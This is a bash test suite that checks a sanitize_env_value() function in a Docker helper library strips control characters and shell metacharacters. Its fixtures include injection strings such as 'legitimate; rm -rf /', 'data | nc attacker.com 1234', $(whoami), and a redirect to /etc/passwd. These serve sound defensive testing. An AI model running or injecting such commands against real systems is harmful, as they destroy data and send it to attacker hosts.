#!/usr/bin/env bash
################################################################################
# Test Suite: Bug Fix Validation - Security Sanitization
# Purpose: Validate control character removal and shell metacharacter stripping
# Coverage: Bug #1 fix in docker-helpers.sh
################################################################################

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../../" && pwd)"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Source the docker-helpers library
DOCKER_HELPERS="$PROJECT_ROOT/.claude/skills/cfn-docker-wave-execution/lib/docker-helpers.sh"
if [[ ! -f "$DOCKER_HELPERS" ]]; then
    echo -e "${RED}ERROR: docker-helpers.sh not found at $DOCKER_HELPERS${NC}"
    exit 1
fi

source "$DOCKER_HELPERS"

log_test() {
    echo -e "${BLUE}[TEST $((TESTS_RUN + 1))]${NC} $*"
}

log_pass() {
    echo -e "${GREEN}  ✓ PASS${NC} $*"
    ((TESTS_PASSED++))
}

log_fail() {
    echo -e "${RED}  ✗ FAIL${NC} $*"
    ((TESTS_FAILED++))
}

run_test() {
    ((TESTS_RUN++))
    "$@"
}

################################################################################
# TEST 1: Control Character Removal
################################################################################
test_control_character_removal() {
    log_test "Control characters should be removed (not converted to spaces)"

    local input=$'Hello\x00World\x01Test\x1F'
    local result
    result=$(sanitize_env_value "$input")

    # Should contain NO spaces from control char conversion
    # Should only contain: HelloWorldTest
    if [[ "$result" == "HelloWorldTest" ]]; then
        log_pass "Control characters removed correctly"
        return 0
    else
        log_fail "Expected 'HelloWorldTest', got '$result'"
        return 1
    fi
}

################################################################################
# TEST 2: Shell Metacharacter Removal
################################################################################
test_shell_metacharacter_removal() {
    log_test "Shell metacharacters should be stripped"

    local input='test;command|another&background$(injection){array}[index]<redirect>*glob?pattern~home`backtick'
    local result
    result=$(sanitize_env_value "$input")

    # Should only contain alphanumeric: testcommandanotherbackgroundinjectionarrayindexredirectglobpatternhomebacktick
    local expected="testcommandanotherbackgroundinjectionarrayindexredirectglobpatternhomebacktick"

    if [[ "$result" == "$expected" ]]; then
        log_pass "Shell metacharacters removed correctly"
        return 0
    else
        log_fail "Expected '$expected', got '$result'"
        return 1
    fi
}

################################################################################
# TEST 3: Semicolon Command Injection Prevention
################################################################################
test_semicolon_injection_prevention() {
    log_test "Semicolon command injection should be blocked"

    local input='legitimate; rm -rf /'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain semicolon
    if [[ "$result" != *";"* ]]; then
        log_pass "Semicolon removed, injection prevented"
        return 0
    else
        log_fail "Semicolon still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 4: Pipe Command Injection Prevention
################################################################################
test_pipe_injection_prevention() {
    log_test "Pipe command injection should be blocked"

    local input='data | nc attacker.com 1234'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain pipe
    if [[ "$result" != *"|"* ]]; then
        log_pass "Pipe removed, injection prevented"
        return 0
    else
        log_fail "Pipe still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 5: Dollar Sign Command Substitution Prevention
################################################################################
test_dollar_substitution_prevention() {
    log_test "Dollar sign command substitution should be blocked"

    local input='user_$(whoami)_data'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain dollar sign or parentheses
    if [[ "$result" != *'$'* ]] && [[ "$result" != *'('* ]] && [[ "$result" != *')'* ]]; then
        log_pass "Command substitution characters removed"
        return 0
    else
        log_fail "Command substitution characters still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 6: Backtick Command Execution Prevention
################################################################################
test_backtick_execution_prevention() {
    log_test "Backtick command execution should be blocked"

    local input='data`id`more'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain backticks
    if [[ "$result" != *'`'* ]]; then
        log_pass "Backticks removed, execution prevented"
        return 0
    else
        log_fail "Backticks still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 7: Ampersand Background Execution Prevention
################################################################################
test_ampersand_background_prevention() {
    log_test "Ampersand background execution should be blocked"

    local input='task & sleep 1000'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain ampersand
    if [[ "$result" != *'&'* ]]; then
        log_pass "Ampersand removed, background execution prevented"
        return 0
    else
        log_fail "Ampersand still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 8: Redirect Operator Removal
################################################################################
test_redirect_removal() {
    log_test "Redirect operators should be removed"

    local input='data > /etc/passwd < /dev/urandom'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain redirect operators
    if [[ "$result" != *'>'* ]] && [[ "$result" != *'<'* ]]; then
        log_pass "Redirect operators removed"
        return 0
    else
        log_fail "Redirect operators still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 9: Wildcard Character Removal
################################################################################
test_wildcard_removal() {
    log_test "Wildcard characters should be removed"

    local input='*.txt file?.log test[0-9].dat'
    local result
    result=$(sanitize_env_value "$input")

    # Should NOT contain wildcards
    if [[ "$result" != *'*'* ]] && [[ "$result" != *'?'* ]] && [[ "$result" != *'['* ]] && [[ "$result" != *']'* ]]; then
        log_pass "Wildcard characters removed"
        return 0
    else
        log_fail "Wildcard characters still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 10: Combined Attack Vector
################################################################################
test_combined_attack_vector() {
    log_test "Combined attack vector should be fully sanitized"

    local input=$'task;rm -rf /|nc evil.com&$(whoami)`id`{arr}[0]<in>out*?~data\x00\x01'
    local result
    result=$(sanitize_env_value "$input")

    # Should only contain safe alphanumeric characters
    local dangerous_chars=';|&$(){}[]<>*?~`'
    local has_dangerous=0

    for (( i=0; i<${#dangerous_chars}; i++ )); do
        char="${dangerous_chars:$i:1}"
        if [[ "$result" == *"$char"* ]]; then
            has_dangerous=1
            break
        fi
    done

    if [[ $has_dangerous -eq 0 ]] && [[ "$result" != *$'\x00'* ]] && [[ "$result" != *$'\x01'* ]]; then
        log_pass "Combined attack fully sanitized"
        return 0
    else
        log_fail "Dangerous characters still present: '$result'"
        return 1
    fi
}

################################################################################
# TEST 11: Safe Data Preservation
################################################################################
test_safe_data_preservation() {
    log_test "Safe alphanumeric data should be preserved"

    local input='HelloWorld123_TestData-Valid.Name'
    local result
    result=$(sanitize_env_value "$input")

    # Should preserve safe characters (alphanumeric, underscore, hyphen, dot)
    if [[ "$result" == *"Hello"* ]] && [[ "$result" == *"World"* ]] && [[ "$result" == *"123"* ]]; then
        log_pass "Safe data preserved correctly"
        return 0
    else
        log_fail "Safe data corrupted: '$result'"
        return 1
    fi
}

################################################################################
# TEST 12: Empty String Handling
################################################################################
test_empty_string_handling() {
    log_test "Empty strings should be handled gracefully"

    local input=''
    local result
    result=$(sanitize_env_value "$input")

    if [[ -z "$result" ]]; then
        log_pass "Empty string handled correctly"
        return 0
    else
        log_fail "Empty string returned non-empty: '$result'"
        return 1
    fi
}

################################################################################
# MAIN TEST EXECUTION
################################################################################

echo "========================================"
echo "Bug Fix Validation: Security Sanitization"
echo "Target: docker-helpers.sh sanitize_env_value()"
echo "========================================"
echo ""

run_test test_control_character_removal
run_test test_shell_metacharacter_removal
run_test test_semicolon_injection_prevention
run_test test_pipe_injection_prevention
run_test test_dollar_substitution_prevention
run_test test_backtick_execution_prevention
run_test test_ampersand_background_prevention
run_test test_redirect_removal
run_test test_wildcard_removal
run_test test_combined_attack_vector
run_test test_safe_data_preservation
run_test test_empty_string_handling

echo ""
echo "========================================"
echo "Test Summary"
echo "========================================"
echo -e "Total Tests:  $TESTS_RUN"
echo -e "${GREEN}Passed:       $TESTS_PASSED${NC}"
echo -e "${RED}Failed:       $TESTS_FAILED${NC}"
echo ""

if [[ $TESTS_FAILED -eq 0 ]]; then
    echo -e "${GREEN}✓ All security sanitization tests passed${NC}"
    exit 0
else
    echo -e "${RED}✗ Some tests failed${NC}"
    exit 1
fi
